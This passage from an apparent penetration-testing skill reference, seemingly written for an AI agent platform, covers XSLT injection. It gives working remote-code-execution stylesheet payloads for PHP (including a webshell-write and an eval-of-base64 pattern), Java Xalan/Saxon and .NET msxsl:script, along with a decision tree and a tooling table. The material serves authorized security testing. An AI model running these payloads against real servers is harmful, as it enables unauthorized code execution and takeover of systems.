# SKILL: XSLT Injection — Testing Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [5. RCE VIA PHP (`php:function`)](#5-rce-via-php-phpfunction)
- [6. RCE VIA JAVA (SAXON / XALAN EXTENSIONS)](#6-rce-via-java-saxon-xalan-extensions)
- [7. RCE VIA .NET (`msxsl:script`)](#7-rce-via-net-msxslscript)
- [8. DECISION TREE](#8-decision-tree)
- [Payloads All The Things (PAT) Note](#payloads-all-the-things-pat-note)
- [Tooling (practical)](#tooling-practical)
- [Related](#related)
<!-- zhiyugo:toc:end -->

## 5. RCE VIA PHP (`php:function`)

Requires PHP XSLT with **`registerPHPFunctions()`**-style exposure (application misconfiguration). Namespace:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Directory listing**:

```xml
<xsl:value-of select="php:function('scandir','.')"/>
```

**Dangerous patterns** (historical abuses — verify only in lab):

- `php:function('assert', string($payload))` — environment-dependent, often deprecated/removed; chained with `include`/`require` in old apps.
- `php:function('file_put_contents','/var/www/shell.php','<?php ...')` — **webshell write** when callable is whitelisted recklessly.
- `preg_replace` with **`/e`** modifier (legacy PHP) — the replacement string is **evaluated as PHP**; metasploit-style chains often wrapped **base64_decode** of a blob to smuggle a **meterpreter** (or other) staged payload. Removed in PHP 7+; only relevant for ancient runtimes.

**Legacy PHP equivalent** (illustrates the `/e` + base64 pattern — lab only):

```php
preg_replace('/.*/e', 'eval(base64_decode("BASE64_PHP_HERE"));', '', 1);
```

Surface from XSLT only if `php:function` exposes `preg_replace` to user stylesheets (rare + critical misconfiguration).

**Tester note**: modern PHP hardening often **blocks** these; absence of RCE does not remove **document()** / **XXE**.

---

## 6. RCE VIA JAVA (SAXON / XALAN EXTENSIONS)

Java engines may expose **extension functions** mapping to static methods. Examples appear in historical advisories; exact syntax depends on **version and extension binding**.

**Illustrative pattern** (conceptual — adjust to permitted extension namespace and API):

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon-style static Java integration** (highly configuration-dependent):

```text
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C ping 192.0.2.1')
```

Replace `192.0.2.1` with your lab listener / documentation IP (RFC 5737 TEST-NET).

**Operational guidance**: if extensions are disabled (common secure default), pivot to **document()**, SSRF, or **deserialization** elsewhere — not every XSLT endpoint runs with extensions on.

---

## 7. RCE VIA .NET (`msxsl:script`)

When Microsoft XSLT **script blocks** are allowed:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

**Default secure configs** often disable scripts — treat this as **when enabled** behavior.

---

## 8. DECISION TREE

```text
                    User influences XSLT or XML transform?
                                    |
                                   NO --> stop (out of scope)
                                    |
                                   YES
                                    |
                    +---------------+---------------+
                    |                               |
             output reflects                       no reflection
             injected logic?                    try blind channels
                    |                               |
                    v                               v
            system-property()                 errors, OOB, timing
            fingerprint vendor                      |
                    |                               |
        +-----------+-----------+                   |
        |           |           |                   |
      libxslt     Java        .NET              document()
        |           |           |                   |
    document()   Saxon/Xalan  msxsl:script?      SSRF/file
    EXSLT write  extensions?      |                   |
        |           |           C# Process         EXSLT?
        v           v           v                   v
    file R/W     rt/exec      cmd.exe /c         map evidence
```

---

## Payloads All The Things (PAT) Note

The **PayloadsAllTheThings** project documents many injection classes; for **XSLT**, maintainer notes indicate **no dedicated maintained tool** section comparable to SQLi/XSS toolchains — exploitation is **processor- and configuration-specific**, driven by proxy/manual payloads and custom scripts. Plan time for **local lab reproduction** with the same engine/version as the target when possible.

---

## Tooling (practical)

| Category | Examples |
|----------|----------|
| Proxy / manual | Burp Suite, OWASP ZAP — replay stylesheet payloads, observe responses and errors |
| XML/XSLT lab | Match **exact** processor (PHP libxslt, Java Saxon version, .NET framework) in a VM |
| Out-of-band | Collaborator / private callback server for `document('http://…')` |

No single universal scanner replaces **version-specific** behavior validation.

---

## Related

- **xxe-xml-external-entity** — DTD/entity hardening, generic XML parsers (``xxe-xml-external-entity``).
- **ssrf-server-side-request-forgery** — when `document(http:…)` or entity URLs cause server fetches (``ssrf-server-side-request-forgery``).
